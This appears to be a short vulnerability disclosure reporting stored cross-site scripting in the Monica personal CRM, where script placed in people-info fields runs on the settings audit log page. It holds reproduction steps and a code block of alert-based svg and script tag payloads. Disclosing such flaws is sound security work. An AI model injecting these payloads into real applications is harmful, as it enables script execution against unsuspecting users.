# Description
 XSS queries being triggered from people info page by the **audit log** at the settings.
# POC
* adding people info filled with payloads [fig1](https://cdn.discordapp.com/attachments/749019614352244777/750572658319425536/monica3.1.PNG)
* Triggering payload [fig2](https://cdn.discordapp.com/attachments/749019614352244777/750572688254173244/monica3.2.PNG)
# Steps to reproduce
* add payloads at the [people page](https://app.monicahq.com/people) 
* trigger multiple payload at [audit log button](https://app.monicahq.com/settings/auditlogs)
# Payloads Used
``` javascript
< <svg/onload=alert("firstname1")><script> alert("firstname2_xss")</script> <script> alert("midname_xss")</script> <script> alert("Lname_xss")</script><svg/onload=alert(1)> (<svg/onload=alert("nickie1")>)
```